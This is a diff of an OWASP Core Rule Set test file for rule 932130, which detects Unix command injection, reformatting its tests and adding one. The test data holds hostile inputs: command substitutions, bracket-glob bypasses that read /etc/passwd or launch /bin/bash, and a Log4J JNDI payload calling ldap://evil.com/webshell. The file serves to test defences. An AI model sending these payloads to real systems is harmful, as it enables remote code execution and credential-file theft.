@@ -1,268 +1,282 @@
 ---
 meta:
   author: "Paul Beckett, Max Leske, azurit"
-  enabled: true
-  name: "932130.yaml"
-  description: "Tests to trigger or not trigger rule 932130"
+rule_id: 932130
 tests:
-  - test_title: 932130-1
+  - test_id: 1
     stages:
-      - stage:
-          input:
-            dest_addr: "127.0.0.1"
-            method: "GET"
-            port: 80
-            headers:
-              User-Agent: "OWASP CRS test agent"
-              Host: "localhost"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/get?932130-1=$(cmd)"
-            version: "HTTP/1.1"
-          output:
-            log_contains: 'id "932130"'
-  - test_title: 932130-2
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/get?932130-1=$(cmd)"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 2
     stages:
-      - stage:
-          input:
-            dest_addr: "127.0.0.1"
-            method: "POST"
-            port: 80
-            headers:
-              User-Agent: "OWASP CRS test agent"
-              Host: "localhost"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/post"
-            data: "932130-2=${cmd}"
-            version: "HTTP/1.1"
-          output:
-            log_contains: 'id "932130"'
-  - test_title: 932130-3
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/post"
+          data: "932130-2=${cmd}"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 3
     stages:
-      - stage:
-          input:
-            dest_addr: "127.0.0.1"
-            method: "GET"
-            port: 80
-            headers:
-              User-Agent: "OWASP CRS test agent"
-              Host: "localhost"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-              Cookie: "931120-3=<(cmd)"
-            uri: "/get"
-            version: "HTTP/1.1"
-          output:
-            log_contains: 'id "932130"'
-  - test_title: 932130-4
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Cookie: "931120-3=<(cmd)"
+          uri: "/get"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 4
     stages:
-      - stage:
-          input:
-            dest_addr: "127.0.0.1"
-            method: "GET"
-            port: 80
-            headers:
-              User-Agent: "OWASP CRS test agent"
-              Host: "localhost"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-              Cookie: ">(cmd)=931120-4"
-            uri: "/get"
-            version: "HTTP/1.1"
-          output:
-            log_contains: 'id "932130"'
-  - test_title: 932130-5
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Cookie: ">(cmd)=931120-4"
+          uri: "/get"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 5
     stages:
-      - stage:
-          input:
-            dest_addr: "127.0.0.1"
-            method: "POST"
-            port: 80
-            headers:
-              User-Agent: "OWASP CRS test agent"
-              Host: "localhost"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            uri: "/post"
-            data: "932130-5=Some text (in brackets)."
-            version: "HTTP/1.1"
-          output:
-            no_log_contains: 'id "932130"'
-  - test_title: 932130-6
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "POST"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/post"
+          data: "932130-5=Some text (in brackets)."
+          version: "HTTP/1.1"
+        output:
+          log:
+            no_expect_ids: [932130]
+  - test_id: 6
     desc: "Log4J exploit picked up by shell exploit detection in body"
     stages:
-      - stage:
-          input:
-            dest_addr: "127.0.0.1"
-            headers:
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-              Host: "localhost"
-              User-Agent: "OWASP CRS test agent"
-              Content-Type: application/json
-            method: POST
-            port: 80
-            uri: "/post"
-            data: '{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}'
-            version: "HTTP/1.1"
-          output:
-            log_contains: 'id "932130"'
-  - test_title: 932130-7
+      - input:
+          dest_addr: "127.0.0.1"
+          headers:
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: application/json
+          method: POST
+          port: 80
+          uri: "/post"
+          data: '{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}'
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 7
     desc: "Unix command injection"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: POST
-            port: 80
-            uri: "/post"
-            data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-8
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: POST
+          port: 80
+          uri: "/post"
+          data: "var=0.84622338492032948`echo${IFS}crs312``echo${IFS}34test`"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 8
     desc: "Unix command injection - character set bypass technique"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            # cat /etc/pa[s]swd
-            uri: "/get?cmd=cat%20/etc/pa%5Bs%5Dswd"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-9
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          # cat /etc/pa[s]swd
+          uri: "/get?cmd=cat%20/etc/pa%5Bs%5Dswd"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 9
     desc: "Unix command injection - character set bypass technique"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            # cat /[?]tc/pa[?]swd
-            uri: "/get?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-10
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          # cat /[?]tc/pa[?]swd
+          uri: "/get?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 10
     desc: "Unix command injection - character set bypass - negative test"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            # hello [text in brackets]
-            uri: "/get?cmd=hello%20%5Btext%20in%20brackets%5D"
-            version: HTTP/1.0
-          output:
-            no_log_contains: id "932130"
-  - test_title: 932130-11
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          # hello [text in brackets]
+          uri: "/get?cmd=hello%20%5Btext%20in%20brackets%5D"
+          version: HTTP/1.0
+        output:
+          log:
+            no_expect_ids: [932130]
+  - test_id: 11
     desc: "Unix command injection - bracket bypass"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            uri: "/get?s=/etc/pas[s]wd"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-12
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          uri: "/get?s=/etc/pas[s]wd"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 12
     desc: "Unix command injection - bracket bypass"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            uri: "/get?s=/etc/%5Bp%5Dasswd"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-13
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          uri: "/get?s=/etc/%5Bp%5Dasswd"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 13
     desc: "Unix command injection - bracket bypass"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            uri: "/get?s=/etc/%5B!q%5Dasswd"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-14
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          uri: "/get?s=/etc/%5B!q%5Dasswd"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 14
     desc: "Unix command injection - bracket bypass"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            uri: "/get?s=/etc/%5Bm-z%5Dasswd"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-15
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          uri: "/get?s=/etc/%5Bm-z%5Dasswd"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 15
     desc: "Unix command injection - bracket bypass"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            uri: "/get?s=/usr/bin/%5Bu%5Dname+-a"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
-  - test_title: 932130-16
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          uri: "/get?s=/usr/bin/%5Bu%5Dname+-a"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 16
     desc: "Unix command injection - bracket bypass"
     stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-              User-Agent: "OWASP CRS test agent"
-              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            method: GET
-            port: 80
-            uri: "/get?exec=/bi%5Bn%5D/bash"
-            version: HTTP/1.0
-          output:
-            log_contains: id "932130"
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: GET
+          port: 80
+          uri: "/get?exec=/bi%5Bn%5D/bash"
+          version: HTTP/1.0
+        output:
+          log:
+            expect_ids: [932130]
+  - test_id: 17
+    desc: "Bash - Arithmetic expansion ($[...])"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: "/get?932130-17=$%5B2%2B2%5D"
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932130]
